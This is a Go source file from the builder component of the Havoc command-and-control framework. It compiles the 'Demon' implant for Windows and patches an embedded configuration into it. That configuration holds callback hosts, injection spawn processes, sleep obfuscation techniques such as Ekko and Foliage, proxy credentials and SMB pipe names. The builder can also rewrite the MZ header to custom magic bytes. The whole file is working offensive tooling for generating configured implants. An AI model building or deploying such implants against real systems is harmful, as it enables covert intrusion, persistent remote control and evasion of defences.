package builder

import (
	"bytes"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path"
	"strconv"
	"strings"

	"github.com/Cracked5pider/Havoc/teamserver/pkg/common/packer"
	"github.com/Cracked5pider/Havoc/teamserver/pkg/handlers"
	"github.com/Cracked5pider/Havoc/teamserver/pkg/logger"
	"github.com/Cracked5pider/Havoc/teamserver/pkg/profile"
	"github.com/Cracked5pider/Havoc/teamserver/pkg/utils"
	"github.com/Cracked5pider/Havoc/teamserver/pkg/win32"
)

// TODO: move to agent package

const (
	FILETYPE_WINDOWS_EXE            = 1
	FILETYPE_WINDOWS_SERVICE_EXE    = 2
	FILETYPE_WINDOWS_DLL            = 3
	FILETYPE_WINDOWS_REFLECTIVE_DLL = 4
	FILETYPE_WINDOWS_RAW_BINARY     = 5
	FILETYPE_WINDOWS_POWERSHELL     = 6
)

const (
	ARCHITECTURE_X64 = 1
	ARCHITECTURE_X86
)

type Builder struct {

	buildSource bool
	sourcePath string

	Payloads []string

	FileType int
	ClientId string

	PatchBinary bool

	ProfileConfig struct {
		MagicMzX64 string
		MagicMzX86 string

		ImageSizeX64 int
		ImageSizeX86 int
	}

	config struct {
		Arch           	int
		ListenerType   	int
		ListenerConfig 	any
		Config 			map[string]any
	}

	ImplantOptions struct {
		Config []byte
	}


	compilerOptions struct {
		Compiler64 string
		Compiler86 string

		SourceDirs  	[]string
		IncludeDirs 	[]string
		CFlags      	[]string
		Defines     	[]string

		Main struct {
			Dll string
			Exe string
		}
	}

	outputPath string

	SendConsoleMessage func(MsgType, Message string)
}

func NewBuilder() *Builder {
	var builder = new(Builder)

	builder.sourcePath = utils.GetTeamserverPath() + "/data/implants/Demon"
	builder.config.Arch = ARCHITECTURE_X64

	builder.compilerOptions.SourceDirs = []string{
		"Source/Core",
		"Source/Crypt",
		"Source/Inject",
		"Source/Loader",
		"Source/Asm",
	}

	builder.compilerOptions.IncludeDirs = []string{
		"Include",
	}

	builder.compilerOptions.CFlags = []string{
		"-Os -fno-asynchronous-unwind-tables -masm=intel -nostdlib",
		"-fno-ident -fpack-struct=8 -falign-functions=1",
		"-s -ffunction-sections -falign-jumps=1 -w",
		"-falign-labels=1 -fPIC",
		"-Wl,-s,--no-seh,--enable-stdcall-fixup",
	}

	builder.compilerOptions.Main.Exe = "Source/Main/MainExe.c"
	builder.compilerOptions.Main.Dll = "Source/Main/MainDll.c"

	builder.compilerOptions.Compiler64 = "x86_64-w64-mingw32-gcc"
	builder.compilerOptions.Compiler86 = "i686-w64-mingw32-gcc"
	builder.PatchBinary = false

	return builder
}

func (b *Builder) Build() bool {
	var (
		CompileCommand string
	)

	b.SendConsoleMessage("Info", "Starting build")

	Config := b.PatchConfig()
	if Config == nil {
		return false
	}

	// add compiler
	if b.config.Arch == ARCHITECTURE_X64 {
		CompileCommand += b.compilerOptions.Compiler64 + " "
	} else {
		CompileCommand += b.compilerOptions.Compiler86 + " "
	}

	// add sources
	for _, dir := range b.compilerOptions.SourceDirs {
		files, err := ioutil.ReadDir(b.sourcePath + "/" + dir)
		if err != nil {
			logger.Error(err)
		}

		for _, f := range files {
			var FilePath = dir + "/" + f.Name()

			if path.Ext(f.Name()) == ".asm" {
				var AsmObj = "/tmp/" + utils.GenerateID(10) + ".o"
				b.Cmd(fmt.Sprintf("nasm -f win64 %s -o %s", FilePath, AsmObj))
				CompileCommand += AsmObj + " "
			} else if path.Ext(f.Name()) == ".c" {
				CompileCommand += FilePath + " "
			}
		}
	}

	// add include directories
	for _, dir := range b.compilerOptions.IncludeDirs {
		CompileCommand += "-I" + dir + " "
	}

	// add cflags
	CompileCommand += strings.Join(b.compilerOptions.CFlags, " ")

	// add defines
	b.compilerOptions.Defines = append(b.compilerOptions.Defines, b.GetListenerDefines()...)
	for _, define := range b.compilerOptions.Defines {
		CompileCommand += " -D" + define + " "
	}

	switch b.FileType {
	case FILETYPE_WINDOWS_EXE:
		logger.Debug("Compile exe")
		CompileCommand += "-e WinMain "
		CompileCommand += b.compilerOptions.Main.Exe + " "
		break

	case FILETYPE_WINDOWS_DLL:
		logger.Debug("Compile dll")
		CompileCommand += "-shared "
		CompileCommand += b.compilerOptions.Main.Dll + " "
		break
	}

	CompileCommand += "-o " + b.outputPath

	b.SendConsoleMessage("Info", "Compiling source")

	return b.CompileCmd(CompileCommand)
}

func (b *Builder) SetListener(Type int, Config any) {
	b.config.ListenerType = Type
	b.config.ListenerConfig = Config
}

func (b *Builder) SetPatchConfig(Config any) {
	logger.Debug("Set Patch config from Profile")
	if Config != nil {
		b.PatchBinary = true
		b.ProfileConfig.MagicMzX64 = Config.(*profile.HeaderBlock).MagicMzX64
		b.ProfileConfig.MagicMzX86 = Config.(*profile.HeaderBlock).MagicMzX86
		b.ProfileConfig.ImageSizeX64 = Config.(*profile.HeaderBlock).ImageSizeX64
		b.ProfileConfig.ImageSizeX86 = Config.(*profile.HeaderBlock).ImageSizeX86
	}
}

func (b *Builder) SetFormat(Format int) {
	b.FileType = Format
}

func (b *Builder) SetArch(Arch int) {
	b.config.Arch = Arch
}

func (b* Builder) SetConfig(Config string) error {
	err := json.Unmarshal([]byte(Config), &b.config.Config)
	if err != nil {
		logger.Error("Failed to Unmarshal json to object: " + err.Error())
		b.SendConsoleMessage("Error", "Failed to Unmarshal json to object: " + err.Error())
		return err
	}

	return nil
}

func (b *Builder) SetOutputPath(path string) {
	b.outputPath = path
}

func (b *Builder) GetOutputPath() string {
	return b.outputPath
}

func (b *Builder) Patch(ByteArray []byte) []byte {

	if b.config.Arch == ARCHITECTURE_X64 {
		if b.ProfileConfig.MagicMzX64 != "" {
			for i := range b.ProfileConfig.MagicMzX64 {
				ByteArray[i] = b.ProfileConfig.MagicMzX64[i]
			}
		}
	} else {
		if b.ProfileConfig.MagicMzX86 != "" {
			for i := range b.ProfileConfig.MagicMzX86 {
				ByteArray[i] = b.ProfileConfig.MagicMzX86[i]
			}
		}
	}

	return ByteArray
}

func (b *Builder) PatchConfig() []byte {
	var (
		DemonConfig 		= packer.NewPacker(nil, nil)
		ConfigSleep			int
		ConfigJitter		int
		ConfigSpawn64		string
		ConfigSpawn32		string
		ConfigObfEnable 	int
		ConfigObfTechnique	int
		err					error
	)

	if val, ok := b.config.Config["Sleep"].(string); ok {
		ConfigSleep, err = strconv.Atoi(val)
		if err != nil {
			b.SendConsoleMessage("Error", "Failed to convert Sleep string to int: " + err.Error())
			return nil
		}
	}

	// Demon Config
	DemonConfig.AddInt(ConfigSleep)
	DemonConfig.AddInt(ConfigJitter)

	if Injection := b.config.Config["Injection"].(map[string]any); len(Injection) > 0 {
		if val, ok := Injection["Spawn64"].(string); ok && len(val) > 0 {
			ConfigSpawn64 = val
		} else {
			b.SendConsoleMessage("Error", "Injection Spawn64 is undefined")
			return nil
		}

		if val, ok := Injection["Spawn32"].(string); ok && len(val) > 0 {
			ConfigSpawn32 = val
		} else {
			b.SendConsoleMessage("Error", "Injection Spawn32 is undefined")
			return nil
		}
	} else {
		b.SendConsoleMessage("Error", "Injection is undefined")
		return nil
	}

	if SleepObfuscation := b.config.Config["Sleep Obfuscation"].(map[string]any); len(SleepObfuscation) > 0 {
		if val, ok := SleepObfuscation["Enable"].(bool); ok {
			ConfigObfEnable = win32.FALSE
			if val {
				ConfigObfEnable = win32.TRUE
			}

		} else {
			b.SendConsoleMessage("Error", "Sleep Obfuscation enable is undefined")
			return nil
		}

		if val, ok := SleepObfuscation["Technique"].(string); ok && len(val) > 0 {
			switch val {
			case "WaitForSingleObjectEx":
				ConfigObfTechnique = 0
				break

			case "Foliage":
				ConfigObfTechnique = 1
				break

			case "Ekko":
				ConfigObfTechnique = 2
				break

			default:
				ConfigObfTechnique = 0
				break
			}
		} else {
			b.SendConsoleMessage("Error", "Sleep Obfuscation technique is undefined")
			return nil
		}
	} else {
		b.SendConsoleMessage("Error", "Sleep Obfuscation is undefined")
		return nil
	}

	DemonConfig.AddString(ConfigSpawn64)
	DemonConfig.AddString(ConfigSpawn32)

	DemonConfig.AddInt(ConfigObfEnable)
	DemonConfig.AddInt(ConfigObfTechnique)

	// Listener Config
	switch b.config.ListenerType {
	case handlers.LISTENER_HTTP:
		var (
			Config 	  = b.config.ListenerConfig.(*handlers.HTTP)
			Port, err = strconv.Atoi(Config.Config.Port)
		)

		if err != nil {
			logger.Error("Failed convert Port string to int: " + err.Error())
		}

		DemonConfig.AddString(Config.Config.Hosts)
		DemonConfig.AddInt(Port)
		if Config.Config.Secure {
			DemonConfig.AddInt(win32.TRUE)
		} else {
			DemonConfig.AddInt(win32.FALSE)
		}
		DemonConfig.AddString(Config.Config.UserAgent)

		DemonConfig.AddInt(len(Config.Config.Headers))
		for _ ,headers := range Config.Config.Headers {
			logger.Debug(headers)
			DemonConfig.AddString(headers)
		}

		DemonConfig.AddInt(len(Config.Config.Uris))
		for _ ,uri := range Config.Config.Uris {
			logger.Debug(uri)
			DemonConfig.AddString(uri)
		}

		// adding proxy connection info
		if Config.Config.Proxy.Enabled {
			DemonConfig.AddInt(win32.TRUE)

			var ProxyUrl = fmt.Sprintf("%v://%v:%v", Config.Config.Proxy.Type, Config.Config.Proxy.Host, Config.Config.Proxy.Port)

			DemonConfig.AddString(ProxyUrl)
			DemonConfig.AddString(Config.Config.Proxy.Username)
			DemonConfig.AddString(Config.Config.Proxy.Password)
		} else {
			DemonConfig.AddInt(win32.FALSE)
		}

		break

	case handlers.LISTENER_PIVOT_SMB:
		var Config = b.config.ListenerConfig.(*handlers.SMB)

		DemonConfig.AddString("\\\\.\\pipe\\" + Config.Config.PipeName)

		break
	}

	logger.Debug("DemonConfig:\n" + hex.Dump(DemonConfig.Buffer()))

	return DemonConfig.Buffer()
}

func (b *Builder) GetPayloadBytes() []byte {
	var (
		FileBuffer 	[]byte
		ConfigBytes	= make([]byte, 1024)
		Padding		= make([]byte, 1024)
		err        	error
	)

	if b.outputPath == "" {
		logger.Error("Output Path is empty")
		b.SendConsoleMessage("Error", "Output Path is empty")
		return nil
	}

	FileBuffer, err = os.ReadFile(b.outputPath)
	if err != nil {
		logger.Error("Couldn't read content of file: " + err.Error())
		b.SendConsoleMessage("Error", "Couldn't read content of file: " + err.Error())
		return nil
	}

	Config := b.PatchConfig()
	if Config == nil {
		return nil
	}

	copy(ConfigBytes, Config)
	for i := range Padding {
		Padding[i] = 0x05
	}

	b.SendConsoleMessage("Info", "Patching implant config")

	FileBuffer = bytes.Replace(FileBuffer, Padding, ConfigBytes, 1)

	if b.PatchBinary {
		FileBuffer = b.Patch(FileBuffer)
	}

	b.SendConsoleMessage("Good", "Payload generated")
	return FileBuffer
}

func (b *Builder) Cmd(cmd string) bool {
	var (
		Command = exec.Command("sh", "-c", cmd)
		stdout  bytes.Buffer
		stderr  bytes.Buffer
		err     error
	)

	Command.Dir = b.sourcePath
	Command.Stdout = &stdout
	Command.Stderr = &stderr

	err = Command.Run()
	if err != nil {
		logger.Error("Couldn't compile implant: " + err.Error())
		b.SendConsoleMessage("Error", "Couldn't compile implant: " + err.Error())
		b.SendConsoleMessage("Error", "Compile output: " + stderr.String())
		logger.Debug(cmd)
		logger.Debug("StdErr:\n" + stderr.String())
		return false
	}
	return true
}

func (b *Builder) CompileCmd(cmd string) bool {

	if b.Cmd(cmd) {
		b.SendConsoleMessage("Info", "Finished compiling source")
		return true
	}

	return false
}

func (b *Builder) GetListenerDefines() []string {
	var defines []string

	switch b.config.ListenerType {

	case handlers.LISTENER_HTTP:

		defines = append(defines, "TRANSPORT_HTTP")
		break

	case handlers.LISTENER_PIVOT_SMB:

		defines = append(defines, "TRANSPORT_SMB")
		break

	}

	return defines
}

func (b *Builder) DeletePayload() {
	if err := os.Remove(b.outputPath); err != nil {
		logger.Error("Couldn't remove " + b.outputPath + ": " + err.Error())
	}
}
